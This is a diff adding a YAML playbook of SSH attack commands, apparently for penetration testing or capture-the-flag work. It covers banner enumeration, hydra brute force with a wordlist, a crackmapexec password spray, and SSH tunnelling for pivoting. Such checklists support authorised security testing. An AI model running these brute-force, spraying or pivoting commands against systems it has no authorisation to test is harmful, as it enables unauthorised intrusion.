@@ -1,0 +1,34 @@
+service: ssh
+ports: [22]
+categories:
+  enumeration:
+    - id: ssh_banner
+      description: "Grab SSH banner/version"
+      command: "nmap -sV -p 22 {IP}"
+      priority: high
+    - id: ssh_auth_methods
+      description: "Check auth methods"
+      command: "ssh -o PreferredAuthentications=none -o ConnectTimeout=5 {USER}@{IP} 2>&1"
+      priority: medium
+  exploitation:
+    - id: ssh_brute
+      description: "Brute force SSH"
+      command: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP}"
+      priority: medium
+    - id: ssh_key_login
+      description: "Login with found SSH key"
+      command: "ssh -i id_rsa {USER}@{IP}"
+      priority: high
+    - id: ssh_spray
+      description: "Password spray"
+      command: "crackmapexec ssh {IP} -u users.txt -p 'Password123!'"
+      priority: medium
+  post_exploitation:
+    - id: ssh_tunnel_local
+      description: "Local port forward"
+      command: "ssh -L {PORT}:127.0.0.1:{PORT} {USER}@{IP}"
+      priority: medium
+    - id: ssh_tunnel_dynamic
+      description: "Dynamic SOCKS proxy"
+      command: "ssh -D 1080 {USER}@{IP}"
+      priority: medium
